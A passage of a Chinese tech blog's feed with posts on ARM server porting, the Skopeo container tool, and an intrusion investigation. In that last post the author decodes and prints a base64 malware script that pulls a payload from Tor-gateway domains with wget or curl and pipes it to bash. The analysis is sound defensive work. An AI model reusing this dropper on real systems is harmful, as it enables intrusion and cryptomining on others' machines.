编译的同学，到这里应该就没有问题了。</p><p>但是，我需要编译 envoy，这东西很恶心的点在于只能用 bazel 编译，官方提供的编译容器镜像只提供了 x86 的，所以最后只能在物理服务器上安装 bazel ，尝试编译。这时候又发现 CentOS 7 上的 libstdc++ 不包含 C++11 的 ABI，所以只能尝试使用 docker 来运行，最后通过 Docker 采用 Ubuntu 18.04 镜像编译出来了，中间经历了无数曲折。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>该编译的都编译完了，接下来安装应该很容易吧，并没有。</p><p>首先，因为 CentOS 默认的 <code>libstdc++</code> 版本太低，导致 MongoDB 无法安装，致命伤，Ubuntu 18.04 和 CentOS8 应该都可以安装，但是因为 CentOS8 官方未发布 ARM64 容器镜像，只能使用 Ubuntu 18.04 镜像将 MongoDB 运行在容器中了。</p><p>因为我不想改动太多的业务代码，所以我使用容器时是采用的 <code>--network=host</code> 模式，假装它不存在。</p><p>其他的软件包大部分都可以在网上找到已有的 ARM64 版本，如果没有只能自己编译了，比如 Redis,Fluent-bit，Prometheus 等等，但是大多没什么问题，很容易解决。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>所有软件都安装上了，终于能开始使用了。因为我负责的服务需要获取硬件信息并展示，根据硬件信息进行相应的配置，发现了一些奇奇怪怪的问题。</p><h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><p>不知道是测试服务器的原因还是故意未暴露出来，友商的 CPU 信息可获取的很少，比如 CPU 主频、支持指令集、CPU Cache 大小等等。</p><p>无论是 <code>lscpu</code> ， <code>cpuinfo</code> 还是 <code>cat /proc/cpuinfo</code> 均无法得到，只能通过修改业务代码来临时运行起来。</p><h3 id="Dmidecode"><a href="#Dmidecode" class="headerlink" title="Dmidecode"></a>Dmidecode</h3><p>与服务器硬件打交道比较多的同学应该都知道 <code>dmidecode</code> 的命令，它能获取到服务器的硬件信息，但是我手上这台能获取的信息也是有限的，下面贴一下 X86 服务器正常获取的信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[yiran@node 18:38:21 ~]<span class="variable">$dmidecode</span> </span><br><span class="line"><span class="comment"># dmidecode 3.0</span></span><br><span class="line">Getting SMBIOS data from sysfs.</span><br><span class="line">SMBIOS 2.7 present.</span><br><span class="line">125 structures occupying 5286 bytes.</span><br><span class="line">Table at 0x000EC640.</span><br><span class="line"></span><br><span class="line">Handle 0x0000, DMI <span class="built_in">type</span> 0, 24 bytes</span><br><span class="line">BIOS Information</span><br><span class="line">Vendor: American Megatrends Inc.</span><br><span class="line">Version: 3.0</span><br><span class="line">Release Date: 06/28/2013</span><br><span class="line">Address: 0xF0000</span><br><span class="line">Runtime Size: 64 kB</span><br><span class="line">ROM Size: 12288 kB</span><br><span class="line">Characteristics:</span><br><span class="line">PCI is supported</span><br><span class="line">BIOS is upgradeable</span><br><span class="line">BIOS shadowing is allowed</span><br><span class="line">Boot from CD is supported</span><br><span class="line">Selectable boot is supported</span><br><span class="line">BIOS ROM is socketed</span><br><span class="line">EDD is supported</span><br><span class="line">5.25<span class="string">"/1.2 MB floppy services are supported (int 13h)</span></span><br><span class="line"><span class="string">3.5"</span>/720 kB floppy services are supported (int 13h)</span><br><span class="line">3.5<span class="string">"/2.88 MB floppy services are supported (int 13h)</span></span><br><span class="line"><span class="string">Print screen service is supported (int 5h)</span></span><br><span class="line"><span class="string">8042 keyboard services are supported (int 9h)</span></span><br><span class="line"><span class="string">Serial services are supported (int 14h)</span></span><br><span class="line"><span class="string">Printer services are supported (int 17h)</span></span><br><span class="line"><span class="string">ACPI is supported</span></span><br><span class="line"><span class="string">USB legacy is supported</span></span><br><span class="line"><span class="string">BIOS boot specification is supported</span></span><br><span class="line"><span class="string">Function key-initiated network boot is supported</span></span><br><span class="line"><span class="string">Targeted content distribution is supported</span></span><br><span class="line"><span class="string">UEFI is supported</span></span><br><span class="line"><span class="string">BIOS Revision: 3.0</span></span><br></pre></td></tr></table></figure><h3 id="dev-mem"><a href="#dev-mem" class="headerlink" title="/dev/mem"></a>/dev/mem</h3><p><code>/dev/mem</code> 是物理内存的映像，可以直接通过它来访问物理内存，在代码运行中，发现服务器一直报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">** COLLECTED WARNINGS **</span><br><span class="line">Failed to open memory buffer (/dev/mem): No such file or directory</span><br><span class="line">No SMBIOS nor DMI entry point found, sorry.</span><br><span class="line">Permission denied to memory file/device (/dev/mem)</span><br><span class="line">Permission denied to memory file/device (/dev/mem)</span><br><span class="line">** END OF WARNINGS **</span><br></pre></td></tr></table></figure><p>发现在服务器上没有 <code>/dev/mem</code> 设备，不知道 ARM 服务器是怎么处理这种情况的。</p><p>P.S. 最终查明是 <code>smartctl</code> 这个命令一直在读取 <code>/dev/mem</code>。</p><h3 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h3><p>ARM64v8 架构的 CPU 理论上是支持 KVM 虚拟化的，但是很可惜，我手上这台友商100 服务器不支持，据说 200 支持，但是没拿到，支持到什么级别不清楚了。（反正我不敢用</p><h2 id="容器？银弹？"><a href="#容器？银弹？" class="headerlink" title="容器？银弹？"></a>容器？银弹？</h2><p>读到这里的可能会问，既然你 MongoDB 和 Envoy 都能运行在容器上，那你把其他服务一起运行在容器上不就薅了么？</p><p>嗯，不是没想过，对于我来说，这面临一个服务管理上的问题，成本太高不适合。</p><p>其次，容器真的就那么容易么？</p><p>大家在使用 Docker 的时候是否注意过自己使用的镜像架构是什么？反正我是没有。一般是 <code>docker pull</code> 拉下来直接用，而且 Docker 并没有提供某些命令或者参数让你能直接拉取其他架构下的镜像，你想知道自己的镜像是什么架构的？可以通过 <code>docker inspect</code> 查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@node ~]<span class="comment"># docker pull centos</span></span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/centos</span><br><span class="line">no matching manifest <span class="keyword">for</span> linux/arm64/v8 <span class="keyword">in</span> the manifest list entries <span class="comment"># 如果没有当前架构下的，那么就会拉取报错</span></span><br><span class="line">[root@node ~]<span class="comment"># docker pull centos:7</span></span><br><span class="line">7: Pulling from library/centos</span><br><span class="line">4856e02b0d50: Pull complete </span><br><span class="line">Digest: sha256:307835c385f656ec2e2fec602cf093224173c51119bbebd602c53c3653a3d6eb</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> centos:7</span><br><span class="line">docker.io/library/centos:7</span><br><span class="line">[root@node ~]<span class="comment"># docker inspect centos:7</span></span><br><span class="line">...</span><br><span class="line">        <span class="string">"Architecture"</span>: <span class="string">"arm64"</span>,</span><br><span class="line">        <span class="string">"Os"</span>: <span class="string">"linux"</span>,</span><br><span class="line">        <span class="string">"Size"</span>: 238639700,</span><br><span class="line">        <span class="string">"VirtualSize"</span>: 238639700,</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>看着没啥问题，我也用起来了，但是某些镜像我发现很奇怪的一点，<code>docker pull</code> 下来的是 amd64 ，但是镜像中的文件是 aarch64 的，我很奇怪，以为自己搞错了，但是确实可以运行，这样的镜像还不少，比如 coredns：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@node ~]<span class="comment"># docker images |grep coredns/coredns</span></span><br><span class="line">coredns/coredns                                                      1.6.2               f937200cdbb2        2 months ago        42.2MB</span><br><span class="line">[root@node ~]<span class="comment"># docker inspect coredns/coredns:1.6.2 |grep -i amd</span></span><br><span class="line">        <span class="string">"Architecture"</span>: <span class="string">"amd64"</span>,</span><br><span class="line">[root@node ~]<span class="comment"># docker run coredns/coredns:1.6.2</span></span><br><span class="line">.:53</span><br><span class="line">2019-11-01T10:40:29.192Z [INFO] CoreDNS-1.6.2</span><br><span class="line">2019-11-01T10:40:29.192Z [INFO] linux/arm64, go1.12.8, 795a3eb</span><br><span class="line">CoreDNS-1.6.2</span><br><span class="line">linux/arm64, go1.12.8, 795a3eb</span><br></pre></td></tr></table></figure><p>搞定了 Docker 是怎么玩的，接下来尝试 Kubernetes，发现国内的镜像源居然没有 ARM64 的版本，放弃了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>国产化浪潮更大的意义是战略性的，真正要用起来，需要花费很大的精力去一点点适配兼容，如果你不想折腾，还是远离的好。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;最近各大 2B 厂家都在搞国产化，我司也不例外，花费了些时间折腾了下 ARM 服务器，记录下踩坑和使用感受。&lt;/p&gt;
&lt;p&gt;本文所使用的开发
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Skopeo 初次体验</title>
    <link href="https://zdyxry.github.io/2019/10/26/Skopeo-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/"/>
    <id>https://zdyxry.github.io/2019/10/26/Skopeo-初次体验/</id>
    <published>2019-10-26T14:52:06.000Z</published>
    <updated>2019-10-26T15:00:01.970Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>新一代容器工具体验系列已经完成了 Podman 和 Buildah 的介绍，今天来体验下三剑客中的 Skopeo。</p><p>容器工具体验系列：</p><ul><li><a href="https://zdyxry.github.io/2019/10/12/Podman-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Podman 初次体验</a></li><li><a href="https://zdyxry.github.io/2019/10/19/Buildah-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Buildah 初次体验</a></li><li><a href="https://zdyxry.github.io/2019/10/26/Skopeo-初次体验/">Skopeo 初次体验</a></li></ul><h2 id="What"><a href="#What" class="headerlink" title="What"></a>What</h2><p>Skopeo 的功能很简单，一句话描述就是：提供远程仓库的镜像管理能力。</p><p>功能列表：</p><ul><li>复制镜像，无需特殊权限即可从不通仓库复制镜像</li><li>无需拉取镜像即可获取远程镜像仓库中的镜像属性（包括 layer）</li><li>删除镜像仓库中的镜像</li><li>…</li></ul><p>支持镜像仓库类型：</p><ul><li>container-storage</li><li>本地路径</li><li>docker registry 仓库</li><li>docker 打包镜像文件</li><li>本地 docker 拉取的镜像文件</li><li>OCI 镜像</li><li>…</li></ul><p><strong>吐槽：Podman 和 Buildah 好歹都有自己的域名： podman.io 和 buildah.io ，Skopeo 虽然用的少但是也得搞个官网吧。。。</strong></p><h2 id="How"><a href="#How" class="headerlink" title="How"></a>How</h2><p>知道了 Skopeo 主要是对镜像仓库及镜像信息的获取，那么我们来看几个具体的例子，了解下 Skopeo 的使用。</p><h3 id="镜像详情"><a href="#镜像详情" class="headerlink" title="镜像详情"></a>镜像详情</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-workstation:~ </span><br><span class="line"> $ skopeo inspect docker://docker.io/fedora       </span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"Name"</span>: <span class="string">"docker.io/library/fedora"</span>,</span><br><span class="line">    <span class="string">"Digest"</span>: <span class="string">"sha256:8a91dbd4b9d283ca1edc2de5dbeef9267b68bb5dae2335ef64d2db77ddf3aa68"</span>,</span><br><span class="line">    <span class="string">"RepoTags"</span>: [</span><br><span class="line">        <span class="string">"20"</span>,</span><br><span class="line">        <span class="string">"21"</span>,</span><br><span class="line">        <span class="string">"22"</span>,</span><br><span class="line">        <span class="string">"23"</span>,</span><br><span class="line">        <span class="string">"24"</span>,</span><br><span class="line">        <span class="string">"25"</span>,</span><br><span class="line">        <span class="string">"26-modular"</span>,</span><br><span class="line">        <span class="string">"26"</span>,</span><br><span class="line">        <span class="string">"27"</span>,</span><br><span class="line">        <span class="string">"28"</span>,</span><br><span class="line">        <span class="string">"29"</span>,</span><br><span class="line">        <span class="string">"30"</span>,</span><br><span class="line">        <span class="string">"31"</span>,</span><br><span class="line">        <span class="string">"32"</span>,</span><br><span class="line">        <span class="string">"branched"</span>,</span><br><span class="line">        <span class="string">"heisenbug"</span>,</span><br><span class="line">        <span class="string">"latest"</span>,</span><br><span class="line">        <span class="string">"modular"</span>,</span><br><span class="line">        <span class="string">"rawhide"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"Created"</span>: <span class="string">"2019-09-27T21:20:57.589955018Z"</span>,</span><br><span class="line">    <span class="string">"DockerVersion"</span>: <span class="string">"18.06.1-ce"</span>,</span><br><span class="line">    <span class="string">"Labels"</span>: &#123;</span><br><span class="line">        <span class="string">"maintainer"</span>: <span class="string">"Clement Verna \u003ccverna@fedoraproject.org\u003e"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"Architecture"</span>: <span class="string">"amd64"</span>,</span><br><span class="line">    <span class="string">"Os"</span>: <span class="string">"linux"</span>,</span><br><span class="line">    <span class="string">"Layers"</span>: [</span><br><span class="line">        <span class="string">"sha256:9908e46907377e84bd6646bdb18abebeb4163b85135739e1cd60aae154d4557c"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以直接从 Docker 官方仓库中查看远程镜像的信息，默认显示所有 RepoTags，也可以增加 tag 参数来显示具体的某个 Tag 镜像的信息。</p><p>来看下具体的镜像信息包含什么，包含镜像的创建时间、Docker 版本、标签信息、哈希值，包含镜像的 Layers 信息等，默认输出并没有镜像大小信息。</p><p>前段时间参加了 VMware Harbor 的一个沙龙，他们在 1.9.0 版本中增加了配额功能，据他们的研发说在关于镜像大小的计算上花费了很大的精力，因为镜像是分层的，在不通镜像之间的数据共享和计算上容易出现偏差，Skopeo 无法获取每层的大小，瞬间感觉使用价值不大了（- - </p><h3 id="镜像拷贝"><a href="#镜像拷贝" class="headerlink" title="镜像拷贝"></a>镜像拷贝</h3><p>将远端镜像拷贝到本地：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-workstation:~ </span><br><span class="line"> $ mkdir fedora                                                                                                   1 ↵</span><br><span class="line">root@yiran-workstation:~ </span><br><span class="line"> $ skopeo copy docker://fedora:32 dir:/root/fedora                                           </span><br><span class="line">Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob a39edc9e7bc3 <span class="keyword">done</span></span><br><span class="line">Copying config e13031c001 <span class="keyword">done</span></span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">root@yiran-workstation:~ </span><br><span class="line"> $ ls fedora </span><br><span class="line">a39edc9e7bc3a586926c94144a8c7ebc83dbfaa17c2a60f4ad56df7066cba285  manifest.json</span><br><span class="line">e13031c001a8b4a574e3088e2d1ab331d72d821804ccacdd41bf5662ae02cc98  version</span><br><span class="line">root@yiran-workstation:~ </span><br><span class="line"> $ ll fedora               </span><br><span class="line">total 67M</span><br><span class="line">-rw-r--r-- 1 root root  67M Oct 26 20:18 a39edc9e7bc3a586926c94144a8c7ebc83dbfaa17c2a60f4ad56df7066cba285</span><br><span class="line">-rw-r--r-- 1 root root 2.0K Oct 26 20:18 e13031c001a8b4a574e3088e2d1ab331d72d821804ccacdd41bf5662ae02cc98</span><br><span class="line">-rw-r--r-- 1 root root  529 Oct 26 20:18 manifest.json</span><br><span class="line">-rw-r--r-- 1 root root   33 Oct 26 20:18 version</span><br></pre></td></tr></table></figure><p>将远端镜像拷贝到其他镜像仓库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-workstation:~ </span><br><span class="line"> $ skopeo copy --dest-creds=zdyxry:xxxxxxxx docker://fedora:32 docker://zdyxry/fedora:32    </span><br><span class="line">Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob a39edc9e7bc3 skipped: already exists</span><br><span class="line">Copying config e13031c001 <span class="keyword">done</span></span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">root@yiran-workstation:~ </span><br><span class="line"> $ skopeo inspect --creds zdyxry:xxxxxxxx docker://zdyxry/fedora:32</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"Name"</span>: <span class="string">"docker.io/zdyxry/fedora"</span>,</span><br><span class="line">    <span class="string">"Digest"</span>: <span class="string">"sha256:3f3fc6a4714e44fae9147bc2b9542ac627491c13c4a3375e5066bdddc7710c9e"</span>,</span><br><span class="line">    <span class="string">"RepoTags"</span>: [</span><br><span class="line">        <span class="string">"32"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"Created"</span>: <span class="string">"2019-09-27T21:21:30.467123272Z"</span>,</span><br><span class="line">    <span class="string">"DockerVersion"</span>: <span class="string">"18.06.1-ce"</span>,</span><br><span class="line">    <span class="string">"Labels"</span>: &#123;</span><br><span class="line">        <span class="string">"maintainer"</span>: <span class="string">"Clement Verna \u003ccverna@fedoraproject.org\u003e"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"Architecture"</span>: <span class="string">"amd64"</span>,</span><br><span class="line">    <span class="string">"Os"</span>: <span class="string">"linux"</span>,</span><br><span class="line">    <span class="string">"Layers"</span>: [</span><br><span class="line">        <span class="string">"sha256:a39edc9e7bc3a586926c94144a8c7ebc83dbfaa17c2a60f4ad56df7066cba285"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="镜像删除"><a href="#镜像删除" class="headerlink" title="镜像删除"></a>镜像删除</h3><p>Skopeo 提供了命令可以直接删除远端镜像仓库中的镜像（Docker 官方仓库不支持该功能），这为 CI/CD 提供了更多的可能性。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ skopeo delete docker://localhost:5000/imagename:latest</span><br></pre></td></tr></table></figure><h2 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h2><p>看过前面两篇文章的同学都知道，Podman 和 Buildah 其实是将 Docker 原有的功能进行了拆分和改进，使其使用上更友好，但是我相信大部分同学日常使用 Podman 和 Buildah 就足够了，那么为什么使用被宣称为三剑客的 Skopeo ？为了解决什么问题？</p><p>在 Quora 上搜到了这个问题，RedHat 容器运行时团队的 Leader Daniel Walsh 回答了这个问题，我整理了一下大概是以下几点原因：</p><ul><li>最初向 Docker 提 PR 想增加 <code>docker inspect -remote</code> 功能，即不用拉取镜像就可以获取镜像信息，但是被拒绝了，官方建议自己实现该功能</li><li>Skopeo 在希腊语中的意思是 <strong>远程查看</strong>，最初实现的功能就是远程查看镜像信息</li><li>后续扩展功能增加了镜像的拉取，推送，复制等功能</li></ul><p>我自己日常在使用 Docker 的时候，通常是 <code>docker pull</code> 得到自己想要的镜像之后，通过 Dockerfile 构建自己的镜像，然后再通过 <code>docker push</code> 推送到镜像仓库，不太会关心镜像仓库的维护，而 Skopeo 就是负责这个事情。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.systutorials.com/docs/linux/man/1-skopeo/" target="_blank" rel="noopener">https://www.systutorials.com/docs/linux/man/1-skopeo/</a></li><li><a href="http://saharsh.org/2019/01/18/buildah_podman_skopeo/" target="_blank" rel="noopener">http://saharsh.org/2019/01/18/buildah_podman_skopeo/</a></li><li><a href="https://www.quora.com/What-is-skopeo-and-why-it-is-used-in-containers" target="_blank" rel="noopener">https://www.quora.com/What-is-skopeo-and-why-it-is-used-in-containers</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;新一代容器工具体验系列已经完成了 Podman 和 Buildah 的介绍，今天来体验下三剑客中的 Skopeo。&lt;/p&gt;
&lt;p&gt;容器工具体
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>记一次系统被入侵分析过程</title>
    <link href="https://zdyxry.github.io/2019/10/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%B3%BB%E7%BB%9F%E8%A2%AB%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/"/>
    <id>https://zdyxry.github.io/2019/10/25/记一次系统被入侵分析过程/</id>
    <published>2019-10-25T14:33:06.000Z</published>
    <updated>2019-10-26T01:10:27.320Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>今天早上接到同事报警，环境中两个节点出现了 CPU 使用率告警，通过 <code>top</code> 查看发现是一个叫 <code>iSdqkI</code> 的进程，但是这明显不是常规进程，初步怀疑是系统被入侵了，在同事的协助下最终解决了。这次主要记录遇到这种问题的排查思路，也算是对过程的复述。</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>首先我们得到的信息是 CPU 使用率告警，第一时间是通过 <code>top</code> 来看看是哪个进程在作怪：</p><img src="/2019/10/25/记一次系统被入侵分析过程/i01.png" title="i01"><p>可以看到 <code>FnrgiY</code> 这个进程 CPU 使用率为 556%，且这个进程不是我们系统中存在的进程，这里判断是入侵后被植入的软件，通过 <code>ps</code> 命令查看进程的具体执行内容：</p><img src="/2019/10/25/记一次系统被入侵分析过程/i02.png" title="i02"><p>可以看到， <code>FnrgiY</code> 应该是一个可执行的程序（可能是脚本，也可能是一个 binary 文件），我非常年轻的想通过 <code>find</code> 查看这个文件在哪，然后 kill 掉进程删除文件就好了：</p><img src="/2019/10/25/记一次系统被入侵分析过程/i03.png" title="i03"><p>嗯，果然年轻了，系统下不存在该文件，那么我们尝试在 <code>/proc/15582</code> 下来看看有什么线索，先看看 <code>cmdline</code> ，跟进程名相同，没啥信息</p><img src="/2019/10/25/记一次系统被入侵分析过程/i04.png" title="i04"><p>同样 <code>stack</code> 文件也没什么有用的信息</p><img src="/2019/10/25/记一次系统被入侵分析过程/i05.png" title="i05"><p>来看看这个进程的 <code>cwd</code> 是啥，可以看到 <code>cwd</code> 是 <code>/usr/bin</code> 路径的软链接，但是我刚刚已经检查过了，在 <code>/usr/bin/</code> 下没有这个可执行文件</p><img src="/2019/10/25/记一次系统被入侵分析过程/i06.png" title="i06"><p>通过 <code>lsof -p</code> 命令，来看看这个进程打开了哪些文件，可以看到它启动的进程文件是 <code>/usr/bin/e6bb0f*</code> ，但是被删掉了，然后它还有一个 TCP 连接（先不管），看到一个存在的文件 <code>/tmp/.X11-unix/1</code> </p><img src="/2019/10/25/记一次系统被入侵分析过程/i07.png" title="i07"><p>来看看这个文件是啥，<code>cat</code> 一下发现这个文件其实是 pid 文件，并没有其他信息</p><img src="/2019/10/25/记一次系统被入侵分析过程/i08.png" title="i08"><p>既然它用到了这个文件，那么我们来看下这个文件所在路径，引用 <a href="https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix" target="_blank" rel="noopener">StackExchange</a> 里面的回答：</p><blockquote><p>The X11 server (usuall Xorg these days) communicates with clients like xterm, firefox, etc via some kind of reliable stream of bytes. A Unix domain socket is probably a bit more secure than a TCP socket open to the world, and probably a bit faster, as the kernel does it all, and does not have to rely on an ethernet or wireless card.</p></blockquote><p>我们来看下这个路径下还有什么文件，发现了 3 个异常的文件： 01, 1, 2，其中 1 文件是异常进程的 pid 文件，2 文件是空的，01 文件记录也是一个 pid</p><img src="/2019/10/25/记一次系统被入侵分析过程/i09.png" title="i09"><p>通过 <code>ps</code> 来查看这个 pid 对应进程，也是一个异常进程，这个进程有一个子进程是执行了一个 Shell 脚本，是通过 Base64 编码过的，来解码看看</p><img src="/2019/10/25/记一次系统被入侵分析过程/i10.png" title="i10"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-workstation:~ </span><br><span class="line"><span class="meta"> $</span><span class="bash"> <span class="built_in">echo</span> ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4KdD10b3JudHBheG53Nnl4aGw0CnUoKSB7Cng9L2Nybgp3Z2V0IC10MSAtVDE4MCAtcVUtIC1PLSAtLW5vLWNoZWNrLWNlcnRpZmljYXRlICQxJHggfHwgY3VybCAtbTE4MCAtZnNTTGtBLSAkMSR4Cn0KaWYgISBscyAvcHJvYy8kKGNhdCAvdG1wLy5YMTEtdW5peC8wMSkvaW87IHRoZW4KKAp1ICR0Lm9uaW9uLmdsYXNzIHx8CnUgJHQuY2l2aWNsaW5rLm5ldHdvcmsgfHwKdSAkdC5vbmlvbi5tbiB8fAp1ICR0Lm9uaW9uLnNoIHx8CnUgJHQub25pb24uaW4ubmV0IHx8CnUgJHQudG9yMndlYi5pbyB8fAp1ICR0LjR0b3IubWwgfHwKdSAkdC5vbmlvbi50bwopfGJhc2gKZmkK|base64 -d</span></span><br><span class="line"></span><br><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line">t=torntpaxnw6yxhl4</span><br><span class="line">u() &#123;</span><br><span class="line">x=/crn</span><br><span class="line">wget -t1 -T180 -qU- -O- --no-check-certificate $1$x || curl -m180 -fsSLkA- $1$x</span><br><span class="line">&#125;</span><br><span class="line">if ! ls /proc/$(cat /tmp/.X11-unix/01)/io; then</span><br><span class="line">(</span><br><span class="line">u $t.onion.glass ||</span><br><span class="line">u 